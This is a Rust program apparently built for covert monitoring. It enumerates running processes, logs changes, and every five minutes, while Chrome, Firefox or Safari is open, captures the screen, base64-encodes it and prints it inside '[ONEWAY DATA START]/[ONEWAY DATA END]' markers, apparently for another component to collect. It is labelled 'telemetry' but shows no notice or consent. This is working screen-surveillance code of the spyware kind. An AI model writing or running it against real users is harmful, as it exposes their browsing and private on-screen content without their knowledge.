use base64::{engine::general_purpose, Engine};
use chrono::Local;
use screenshots::{image, Screen};
use std::sync::{Arc, Mutex};
use std::thread::sleep;
use std::time::Duration;
use sysinfo::System;

const PROC_WAIT_TIME: u64 = 60 * 5;
const DATA_START: &str = "[ONEWAY DATA START]";
const DATA_END: &str = "[ONEWAY DATA END]";


fn get_current_date_time() -> String {
    let now = Local::now();
    now.format("%m/%d/%Y %H:%M:%S").to_string()
}

fn get_processes() -> Vec<String> {
    let system = System::new_all();
    let mut proc_array: Vec<String> = Vec::new();
    for process in system.processes().values() {
        proc_array.push(process.name().to_str().unwrap_or("N/A").to_string())
    }
    proc_array
}

fn compare_processes(old_proc: Arc<Mutex<Vec<String>>>, new_proc: Arc<Mutex<Vec<String>>>) -> (Vec<String>, Vec<String>) {
    let old = old_proc.lock().unwrap();
    let new = new_proc.lock().unwrap();

    let removed: Vec<String> = old.iter()
        .filter(|p| !new.contains(p))
        .cloned()
        .collect();

    let added: Vec<String> = new.iter()
        .filter(|p| !old.contains(p))
        .cloned()
        .collect();

    (added, removed)
}

fn proc_list_contains_key_proc(proc_list: Arc<Mutex<Vec<String>>>) -> bool {
    let proc_list = proc_list.lock().unwrap();
    let keywords = vec!["Google Chrome", "firefox", "Safari"];

    proc_list.iter().any(|proc| {
        keywords.iter().any(|key| proc == key)
    })
}

fn get_screenshot() -> Result<Vec<u8>, String> {
    let screens = Screen::all().map_err(|e| format!("Failed to get screens: {}", e))?;
    let screen = screens.first().ok_or("No screens found")?;
    let image = screen.capture().map_err(|e| format!("Failed to capture screenshot: {}", e))?;

    let mut png_bytes = Vec::new();
    image.write_to(&mut std::io::Cursor::new(&mut png_bytes), image::ImageFormat::Png)
        .map_err(|e| format!("Failed to encode PNG: {}", e))?;

    Ok(png_bytes)
}

fn serialize_data(data: Vec<u8>) -> String {
    general_purpose::STANDARD.encode(data)
}

fn proc_loop() {
    println!("{} TELEMETRY PROCESSES {}", "-".repeat(10), "-".repeat(10));
    let first_proc = Arc::new(Mutex::new(get_processes()));
    {
        let proc_list = first_proc.lock().unwrap();
        for process in proc_list.iter() {
            println!("{}", process);
        }
    }

    loop {
        let first_proc_clone = first_proc.clone();

        if proc_list_contains_key_proc(first_proc_clone.clone()) {
            let screenshot_result = get_screenshot();
            if let Err(e) = screenshot_result {
                eprintln!("Screenshot failed: {}", e);
                sleep(Duration::from_secs(PROC_WAIT_TIME));
                continue;
            }

            let data = serialize_data(screenshot_result.unwrap());
            println!("{}", DATA_START);
            println!("{}", data);
            println!("{}", DATA_END);
        }

        sleep(Duration::from_secs(PROC_WAIT_TIME));

        let new_proc = get_processes();

        let (added, removed) = compare_processes(first_proc.clone(), Arc::new(Mutex::new(new_proc.clone())));

        if !added.is_empty() || !removed.is_empty() {
            println!("--- PROCESS UPDATE ---");
            for process in added {
                println!("+ {}", process);
            }
            for process in removed {
                println!("- {}", process);
            }
        }

        {
            let mut old_proc = first_proc.lock().unwrap();
            *old_proc = new_proc;
        }
    }
}

fn main() {
    println!("{}", get_current_date_time());
    let handle = std::thread::spawn(|| {
        proc_loop();
    });
    handle.join().unwrap();
    println!("{}", get_current_date_time());
}
